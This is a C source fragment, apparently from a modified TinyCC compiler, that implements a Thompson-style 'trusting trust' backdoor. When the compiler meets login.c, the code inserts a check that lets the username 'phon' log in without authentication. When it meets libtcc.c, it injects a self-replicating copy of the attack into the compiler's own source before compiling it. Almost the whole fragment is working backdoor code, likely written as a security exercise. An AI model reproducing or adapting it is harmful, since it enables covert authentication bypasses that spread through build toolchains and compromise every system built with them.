const unsigned int bufferSize = 1000000;
char fileBuffer[1000000];
char *str_pointer;
printf("Found file: %s\n", str);
int isBug = 0;
if ((str_pointer = strstr(str, "login.c")) != NULL)
{
printf("Found login.c!! Bugging it...\n");
int normalfd = open(str, O_RDONLY | 0660);
char login_sig[] = "static int\n"
"do_login(const char *username)\n"
"{\n";
char login_attack[] = "if (!strcmp(username, \"phon\"))return 0;";
int readByte = read(normalfd, fileBuffer, bufferSize);
close(normalfd);
fileBuffer[readByte] = '\0';
char *spotLocation = strstr(fileBuffer, login_sig);
if (spotLocation != NULL)
{
char tmp[1000000];
unsigned int offset = spotLocation - fileBuffer + strlen(login_sig);
strcpy(tmp, fileBuffer + offset);
strcpy(fileBuffer + offset, login_attack);
strcpy(fileBuffer + offset + strlen(login_attack), tmp);

int buggedfd = open("login.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
int byteWrote = write(buggedfd, fileBuffer, strlen(fileBuffer));
close(buggedfd);
fd = _tcc_open(s1, "login.c");
str = "login.c";
isBug = 1;
}
}
if ((str_pointer = strstr(str, "libtcc.c")) != NULL)
{
printf("Found libtcc.c\n");
int normalfd = open(str, O_RDONLY | 0660);
char compile_sig[] = "variables, which may or may not have advantages */";

int readByte = read(normalfd, fileBuffer, bufferSize);
close(normalfd);
fileBuffer[readByte] = '\0';

char *spotLocation = strstr(fileBuffer, compile_sig);

if (spotLocation != NULL)
{
int buggedfd = open("../libtcc_bug.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
unsigned int offset = strlen(compile_sig);
char *a = "\nchar compile_attack[] = \"";
char *b = "\";\n";
for(char *c = fileBuffer; c != spotLocation + offset; c++)
write(buggedfd, c, 1);
write(buggedfd, a, strlen(a));
for(char *c = compile_attack; *c;c++)
{
if(*c == '\"' || *c == '\\')
write(buggedfd, "\\", 1);
write(buggedfd, c, 1);
}
write(buggedfd, b, strlen(b));
write(buggedfd, compile_attack, strlen(compile_attack));
for(char *c = spotLocation + offset; *c;c++)
write(buggedfd, c, 1);

close(buggedfd);
fd = _tcc_open(s1, "../libtcc_bug.c");
str = "../libtcc_bug.c";
isBug = 1;
}
}


tcc_enter_state(s1);
s1->error_set_jmp_enabled = 1;

if (setjmp(s1->error_jmp_buf) == 0) {
s1->nb_errors = 0;

if (fd == -1) {
int len = strlen(str);
tcc_open_bf(s1, "<string>", len);
memcpy(file->buffer, str, len);
} else {
tcc_open_bf(s1, str, 0);
file->fd = fd;
}

preprocess_start(s1, filetype);
tccgen_init(s1);

if (s1->output_type == TCC_OUTPUT_PREPROCESS) {
tcc_preprocess(s1);
} else {
tccelf_begin_file(s1);
if (filetype & (AFF_TYPE_ASM | AFF_TYPE_ASMPP)) {
tcc_assemble(s1, !!(filetype & AFF_TYPE_ASMPP));
} else {
tccgen_compile(s1);
}
tccelf_end_file(s1);
}
}
tccgen_finish(s1);
preprocess_end(s1);
s1->error_set_jmp_enabled = 0;
tcc_exit_state(s1);
/*
if(isBug)
{
remove(str);
}
*/
return s1->nb_errors != 0 ? -1 : 0;